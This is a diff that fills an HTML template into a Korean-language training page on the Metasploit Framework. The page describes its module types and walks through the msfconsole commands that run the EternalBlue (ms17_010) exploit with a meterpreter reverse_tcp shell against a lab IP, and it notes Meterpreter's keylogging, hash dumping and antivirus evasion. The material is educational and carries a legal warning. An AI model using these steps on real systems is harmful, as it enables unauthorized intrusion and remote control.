@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{주제}: {부제} 실습</title>
+    <title>Metasploit Framework: 침투 테스트 실습</title>
     <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -24,6 +24,7 @@
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+        .footnote { font-size: 0.85rem; color: #94a3b8; border-top: 1px dashed #334155; padding-top: 0.5rem; margin-top: 1rem; }
     </style>
 </head>
 <body class="antialiased pb-20">
@@ -34,15 +35,15 @@
             <div>
                 <div class="flex items-center gap-2 mb-2">
                     <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
-                    <span class="text-slate-500 font-mono text-[10px]">{ID} | {Category}</span>
+                    <span class="text-slate-500 font-mono text-[10px]">SEC-PT-101 | Penetration Testing</span>
                 </div>
                 <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
-                    {Main Title}<br><span class="text-slate-100 text-2xl">{Sub Title}</span>
+                    Metasploit Framework (MSF)<br><span class="text-slate-100 text-2xl">모의 해킹 및 취약점 검증 플랫폼</span>
                 </h1>
             </div>
             <div class="text-right hidden md:block border-l border-slate-800 pl-6">
                 <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
-                    SCORE: {0.0}
+                    SCORE: 9.8
                 </div>
                 <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">System Architect Pro</p>
             </div>
@@ -54,107 +55,255 @@
         <!-- Section 1: 이론 및 아키텍처 도식 -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                1. 아키텍처 개요 (Architecture Overview)
+                아키텍처 개요 (Architecture Overview)
             </h2>
             <div class="section-card rounded-3xl p-10 shadow-2xl">
-                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
-                    {여기에 주요 개념 설명을 입력하세요. 전문 용어는 한글명(English Term) 형식을 유지합니다.}
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed block">
+                    <a href="https://www.metasploit.com/" target="_blank" class="text-cyan-400 hover:underline font-bold">Metasploit(메타스플로잇)</a>은 전 세계적으로 가장 많이 사용되는 <strong>Penetration Testing(페너트레이션 테스팅, 침투 테스트 및 모의 해킹)</strong> 플랫폼입니다. 대상 시스템의 취약점을 탐지하고, 실제 공격 코드를 실행하여 보안 상태를 점검하는 데 최적화되어 있습니다. 무료 오픈소스 버전과 상용 프로 버전이 존재하며, 실무 보안 점검의 표준 도구로 자리매김하고 있습니다.
                 </p>
 
                 <!-- 도식화 인포그래픽 영역 -->
                 <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
                     <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
-                        [도식: {시스템 아키텍처 명칭}]
+                        [도식: 침투 테스트 공격 흐름도]
                     </h4>
                     <div class="flex flex-col md:flex-row items-center justify-between gap-4">
                         <!-- Component A -->
-                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg">
-                            <i data-lucide="monitor" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
-                            <div class="font-black text-slate-100 text-sm">{컴포넌트 A}</div>
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg w-full">
+                            <i data-lucide="terminal-square" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">공격자 (Attacker)</div>
+                            <div class="text-[10px] text-slate-400 mt-2 font-mono">MSF Console / Kali Linux</div>
                         </div>
                         <!-- Arrow -->
-                        <div class="flex flex-col items-center">
-                            <i data-lucide="arrow-right" class="w-8 h-8 text-slate-600 rotate-90 md:rotate-0"></i>
+                        <div class="flex flex-col items-center px-4">
+                            <div class="text-[10px] text-cyan-400 font-bold mb-2 uppercase tracking-widest">Exploit & Payload</div>
+                            <i data-lucide="arrow-right" class="w-8 h-8 text-cyan-600 rotate-90 md:rotate-0"></i>
                         </div>
                         <!-- Component B -->
-                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-blue-900/50 shadow-lg">
-                            <i data-lucide="database" class="w-12 h-12 text-blue-400 mx-auto mb-4"></i>
-                            <div class="font-black text-slate-100 text-sm">{컴포넌트 B}</div>
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-red-900/50 shadow-lg w-full">
+                            <i data-lucide="server-crash" class="w-12 h-12 text-red-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">대상 서버 (Target)</div>
+                            <div class="text-[10px] text-slate-400 mt-2 font-mono">Vulnerable System</div>
                         </div>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section 2: 실습 환경 -->
+        <!-- Section 2: 주요 모듈 구성 -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                2. 실습 구성 요소 (Components)
+                주요 모듈 구성 (Core Modules)
             </h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div class="section-card rounded-3xl p-8 border-cyan-900/30 shadow-xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 bg-cyan-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">NODE 01</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="terminal" class="w-6 h-6 text-cyan-400"></i> {대상 A}
+            <p class="text-slate-300 text-base mb-8">
+                Metasploit은 기능별로 모듈화(Modularized)되어 있어 높은 확장성을 제공합니다. 각 모듈의 역할은 다음과 같습니다.
+            </p>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Module 1 -->
+                <div class="section-card rounded-2xl p-6 border-cyan-900/30 shadow-xl relative overflow-hidden transition-transform hover:-translate-y-1">
+                    <div class="absolute top-0 right-0 bg-cyan-600 text-white text-[10px] font-black px-3 py-1 rounded-bl-lg uppercase tracking-tighter">ATTACK</div>
+                    <h3 class="text-lg font-bold text-slate-100 mb-4 flex items-center gap-2">
+                        <i data-lucide="swords" class="w-5 h-5 text-cyan-400"></i> Exploit
                     </h3>
-                    <ul class="space-y-4 text-sm text-slate-300">
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-cyan-500"></i> {세부사항 1}</li>
-                    </ul>
+                    <p class="text-sm text-slate-300">
+                        <strong>(익스플로잇, 취약점 공격 코드)</strong><br>
+                        대상 시스템의 약점(Bug)이나 설계 결함을 이용하여 침투하는 실제 공격 코드입니다.
+                    </p>
                 </div>
-                <div class="section-card rounded-3xl p-8 border-indigo-900/30 shadow-xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 bg-indigo-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">NODE 02</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="server" class="w-6 h-6 text-indigo-400"></i> {대상 B}
+
+                <!-- Module 2 -->
+                <div class="section-card rounded-2xl p-6 border-indigo-900/30 shadow-xl relative overflow-hidden transition-transform hover:-translate-y-1">
+                    <div class="absolute top-0 right-0 bg-indigo-600 text-white text-[10px] font-black px-3 py-1 rounded-bl-lg uppercase tracking-tighter">EXECUTE</div>
+                    <h3 class="text-lg font-bold text-slate-100 mb-4 flex items-center gap-2">
+                        <i data-lucide="cpu" class="w-5 h-5 text-indigo-400"></i> Payload
                     </h3>
-                    <ul class="space-y-4 text-sm text-slate-300">
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-indigo-500"></i> {세부사항 1}</li>
-                    </ul>
+                    <p class="text-sm text-slate-300">
+                        <strong>(페이로드, 공격 수행 코드)</strong><br>
+                        침투 성공 후, 대상 시스템에서 실행할 동작(예: 리버스 쉘 연결, 백도어 설치 등)을 정의합니다.
+                    </p>
                 </div>
+
+                <!-- Module 3 -->
+                <div class="section-card rounded-2xl p-6 border-emerald-900/30 shadow-xl relative overflow-hidden transition-transform hover:-translate-y-1">
+                    <div class="absolute top-0 right-0 bg-emerald-600 text-white text-[10px] font-black px-3 py-1 rounded-bl-lg uppercase tracking-tighter">SCAN</div>
+                    <h3 class="text-lg font-bold text-slate-100 mb-4 flex items-center gap-2">
+                        <i data-lucide="radar" class="w-5 h-5 text-emerald-400"></i> Auxiliary
+                    </h3>
+                    <p class="text-sm text-slate-300">
+                        <strong>(옥질리어리, 보조 도구)</strong><br>
+                        스캐닝(Scanning), 스니핑(Sniffing), 서비스 거부 공격(DoS) 등 공격 전 단계의 정보 수집과 보조 작업을 돕습니다.
+                    </p>
+                </div>
+
+                <!-- Module 4 -->
+                <div class="section-card rounded-2xl p-6 border-purple-900/30 shadow-xl relative overflow-hidden transition-transform hover:-translate-y-1">
+                    <div class="absolute top-0 right-0 bg-purple-600 text-white text-[10px] font-black px-3 py-1 rounded-bl-lg uppercase tracking-tighter">CONTROL</div>
+                    <h3 class="text-lg font-bold text-slate-100 mb-4 flex items-center gap-2">
+                        <i data-lucide="key" class="w-5 h-5 text-purple-400"></i> Post
+                    </h3>
+                    <p class="text-sm text-slate-300">
+                        <strong>(포스트, 침투 후 작업)</strong><br>
+                        침투 성공 이후 시스템 내부 정보 수집, 권한 상승(Privilege Escalation), 흔적 제거 등을 수행하는 모듈입니다.
+                    </p>
+                </div>
+
+                <!-- Module 5 -->
+                <div class="section-card rounded-2xl p-6 border-orange-900/30 shadow-xl relative overflow-hidden transition-transform hover:-translate-y-1">
+                    <div class="absolute top-0 right-0 bg-orange-600 text-white text-[10px] font-black px-3 py-1 rounded-bl-lg uppercase tracking-tighter">EVADE</div>
+                    <h3 class="text-lg font-bold text-slate-100 mb-4 flex items-center gap-2">
+                        <i data-lucide="shield-off" class="w-5 h-5 text-orange-400"></i> Encoder
+                    </h3>
+                    <p class="text-sm text-slate-300">
+                        <strong>(인코더, 암호화/난독화 도구)</strong><br>
+                        백신(Anti-Virus)이나 IDS/IPS의 탐지를 피하기 위해 페이로드의 시그니처를 변조하고 암호화합니다.
+                    </p>
+                </div>
+            </div>
+            
+            <div class="footnote">
+                * <strong>IDS/IPS (Intrusion Detection/Prevention System, 침입 탐지/방지 시스템):</strong> 네트워크나 시스템의 비정상적인 활동을 모니터링하고 차단하는 보안 솔루션입니다.<br>
+                * <strong>DoS (Denial of Service, 서비스 거부 공격):</strong> 시스템 리소스를 고갈시켜 정상적인 서비스를 방해하는 공격입니다.
             </div>
         </section>
 
-        <!-- Section 3: 명령어 및 절차 -->
+        <!-- Section 3: 기본 사용 흐름 -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                3. 실증 및 구현 (Implementation)
+                기본 사용 흐름 (Step-by-Step Implementation)
             </h2>
+            <p class="text-slate-300 text-base mb-8">
+                모의 해킹의 표준 절차인 <strong>정보 수집 &rarr; 취약점 분석 &rarr; 침투 &rarr; 결과 보고</strong> 과정을 MSF 내부 명령어로 구현하는 방법입니다.
+            </p>
+
             <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
-                <!-- Step Block -->
+                
+                <!-- Step 1 -->
                 <div class="space-y-4">
                     <div class="flex items-center gap-3">
-                        <span class="bg-cyan-500 text-slate-900 w-6 h-6 rounded-full flex items-center justify-center text-xs font-black italic">STEP 01</span>
-                        <h3 class="text-xl font-bold text-slate-100">{단계 제목}</h3>
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic shadow-lg shadow-cyan-500/30">01</span>
+                        <h3 class="text-xl font-bold text-slate-100">서비스 실행 및 접속</h3>
                     </div>
                     <div class="pl-12">
-                        <p class="text-sm text-slate-400 mb-4">{수행할 작업에 대한 설명}</p>
+                        <p class="text-sm text-slate-400 mb-4 block">
+                            터미널에서 메타스플로잇 콘솔(msfconsole)을 실행합니다. 네트워크 소켓을 열거나 시스템 리소스에 접근하기 위해 일반적으로 <strong>관리자 권한(root)</strong>이 필요합니다.
+                        </p>
                         <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
-                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Console</div>
-                            <div class="text-slate-200">$ <span class="text-cyan-400">{command}</span></div>
-                            <div class="text-slate-500 mt-2">{output line 1}</div>
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-red-500"></div><div class="w-2 h-2 rounded-full bg-yellow-500"></div><div class="w-2 h-2 rounded-full bg-green-500"></div></div>
+                            <div class="text-slate-300">kali@attacker:~$ <span class="text-cyan-400 font-bold">sudo msfconsole</span></div>
+                            <div class="text-slate-500 mt-2">
+                                 <br>
+                                 =[ metasploit v6.3.0-dev ]<br>
+                                 + -- --=[ 2301 exploits - 1200 auxiliary - 400 post ]<br>
+                                 msf6 >
+                            </div>
                         </div>
                     </div>
                 </div>
+
+                <!-- Step 2 -->
+                <div class="space-y-4">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic shadow-lg shadow-cyan-500/30">02</span>
+                        <h3 class="text-xl font-bold text-slate-100">모듈 검색 및 선택</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-4 block">
+                            공격하려는 서비스나 취약점(예: SMB 프로토콜, Log4j 등)을 <code>search</code> 명령어로 검색하고, <code>use</code> 명령어로 사용할 모듈을 로드합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-red-500"></div><div class="w-2 h-2 rounded-full bg-yellow-500"></div><div class="w-2 h-2 rounded-full bg-green-500"></div></div>
+                            <div class="text-slate-300">msf6 > <span class="text-cyan-400 font-bold">search ms17_010</span></div>
+                            <div class="text-slate-500 mt-2 mb-4">Matching Modules<br>================<br>...</div>
+                            <div class="text-slate-300">msf6 > <span class="text-cyan-400 font-bold">use exploit/windows/smb/ms17_010_eternalblue</span></div>
+                            <div class="text-slate-500 mt-2">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="space-y-4">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic shadow-lg shadow-cyan-500/30">03</span>
+                        <h3 class="text-xl font-bold text-slate-100">옵션 설정 (Payload 및 IP/Port)</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-4 block">
+                            <code>show options</code>를 통해 필수 설정값을 확인합니다. <strong>RHOSTS (Remote Hosts, 공격 대상 IP)</strong>와 <strong>LHOST (Local Host, 공격자 IP)</strong>를 설정하고 적절한 페이로드를 지정합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-red-500"></div><div class="w-2 h-2 rounded-full bg-yellow-500"></div><div class="w-2 h-2 rounded-full bg-green-500"></div></div>
+                            <div class="text-slate-300">msf6 exploit(...) > <span class="text-cyan-400 font-bold">show options</span></div>
+                            <div class="text-slate-300 mt-4">msf6 exploit(...) > <span class="text-cyan-400 font-bold">set RHOSTS 192.168.1.100</span> <span class="text-slate-500"># 대상 IP 설정</span></div>
+                            <div class="text-slate-300">msf6 exploit(...) > <span class="text-cyan-400 font-bold">set LHOST 192.168.1.50</span> <span class="text-slate-500"># 내 IP 설정</span></div>
+                            <div class="text-slate-300 mt-4">msf6 exploit(...) > <span class="text-cyan-400 font-bold">show payloads</span></div>
+                            <div class="text-slate-300">msf6 exploit(...) > <span class="text-cyan-400 font-bold">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 4 -->
+                <div class="space-y-4">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic shadow-lg shadow-cyan-500/30">04</span>
+                        <h3 class="text-xl font-bold text-slate-100">공격 실행 (Exploitation)</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-4 block">
+                            모든 준비가 완료되면 <code>exploit</code> 또는 <code>run</code> 명령어를 입력하여 공격을 수행합니다. 성공 시 대상 서버의 제어권을 획득하게 됩니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
+                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-red-500"></div><div class="w-2 h-2 rounded-full bg-yellow-500"></div><div class="w-2 h-2 rounded-full bg-green-500"></div></div>
+                            <div class="text-slate-300">msf6 exploit(...) > <span class="text-cyan-400 font-bold">exploit</span></div>
+                            <div class="text-emerald-500 mt-2">
+                                [*] Started reverse TCP handler on 192.168.1.50:4444 <br>
+                                [*] Sending all but last fragment of exploit packet<br>
+                                [*] Sending the last fragment of exploit packet!<br>
+                                [*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:49158)
+                            </div>
+                            <div class="text-slate-300 mt-2">meterpreter > </div>
+                        </div>
+                    </div>
+                </div>
+
             </div>
         </section>
 
-        <!-- Section 4: 전문가 분석 -->
+        <!-- Section 4: 아키텍트 인사이트 -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                4. 아키텍트 인사이트 (Expert Insight)
+                아키텍트 인사이트 (Expert Insight)
             </h2>
             <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-10">
                 <div class="flex flex-col md:flex-row gap-8">
-                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                    <!-- Tip 1 -->
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700 hover:border-cyan-500/50 transition-colors">
                         <div class="text-cyan-400 mb-4"><i data-lucide="lightbulb" class="w-8 h-8"></i></div>
-                        <h4 class="font-bold text-slate-100 mb-2">{핵심 팁 제목}</h4>
-                        <p class="text-xs text-slate-400 leading-relaxed">{상세 설명}</p>
+                        <h4 class="font-bold text-slate-100 mb-2">실무 활용 팁: Meterpreter 및 DB 연동</h4>
+                        <p class="text-sm text-slate-300 leading-relaxed block">
+                            <strong>Meterpreter(미터프리터)</strong>는 MSF에서 제공하는 매우 강력한 전용 고급 페이로드입니다. 하드디스크에 파일을 남기지 않고 <strong>메모리 상에서만 동작(In-Memory)</strong>하여 포렌식 추적을 회피할 수 있으며, 키로깅, 웹캠 제어, 해시 덤프 등 대상 시스템을 강력하게 제어하는 대화형 쉘을 제공합니다.
+                        </p>
+                        <p class="text-sm text-slate-300 leading-relaxed block mt-3">
+                            또한, 실무에서는 터미널 외부에서 <code>msfdb init</code> 명령어를 통해 <strong>PostgreSQL 데이터베이스</strong>와 연동하는 것이 필수입니다. 이를 통해 Nmap 스캔 결과와 획득한 자격 증명(Credentials)을 워크스페이스(Workspace)별로 체계적으로 관리하고 보고서 작성을 자동화할 수 있습니다.
+                        </p>
                     </div>
-                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
-                        <div class="text-red-400 mb-4"><i data-lucide="shield-alert" class="w-8 h-8"></i></div>
-                        <h4 class="font-bold text-slate-100 mb-2">{주의 사항 제목}</h4>
-                        <p class="text-xs text-slate-400 leading-relaxed">{상세 설명}</p>
+                    
+                    <!-- Warning -->
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700 hover:border-red-500/50 transition-colors">
+                        <div class="text-red-400 mb-4"><i data-lucide="shield-alert" class="w-8 h-8 text-glow"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">법적 고지 및 주의사항</h4>
+                        <p class="text-sm text-slate-300 leading-relaxed block">
+                            Metasploit은 실제 해킹 공격 도구입니다. <strong>명시적으로 허가받지 않은 타인의 시스템이나 퍼블릭 클라우드 인스턴스를 대상으로 테스트를 진행할 경우, 정보통신망법(정보통신망 이용촉진 및 정보보호 등에 관한 법률)에 의해 무거운 형사 처벌을 받을 수 있습니다.</strong>
+                        </p>
+                        <p class="text-sm text-slate-300 leading-relaxed block mt-3">
+                            침투 테스트 실습은 반드시 격리된 사설망 내의 가상 환경(VirtualBox, VMware 등)에 구축된 실습용 타겟(예: Metasploitable2, DVWA)을 대상으로만 수행해야 합니다.
+                        </p>
                     </div>
                 </div>
+            </div>
+            
+            <div class="footnote">
+                * <strong>PostgreSQL (포스트그레스큐엘):</strong> 확장성과 표준 준수를 강조하는 강력한 오픈 소스 객체-관계형 데이터베이스 시스템(ORDBMS)입니다. MSF의 백엔드 DB로 사용됩니다.<br>
+                * <strong>In-Memory Execution (인메모리 실행):</strong> 디스크에 파일을 쓰지 않고 RAM 메모리 공간 내에서만 프로그램 코드를 실행하여 보안 소프트웨어의 파일 기반 탐지를 우회하는 기술입니다.
             </div>
         </section>
 
@@ -162,10 +311,10 @@
 
     <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
         <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
-            © 2026 {Author Name}. All rights reserved.
+            © 2026 System Architect Pro. All rights reserved.
         </div>
-        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
-            {법적 고지 또는 추가 설명 문구}
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic block">
+            본 교재는 IP 직업훈련 전문가과정 수강생을 위한 교육용 자료입니다. 본 자료에 포함된 기술을 악용하여 발생하는 모든 법적 책임은 사용자 본인에게 있습니다.
         </p>
     </footer>
 
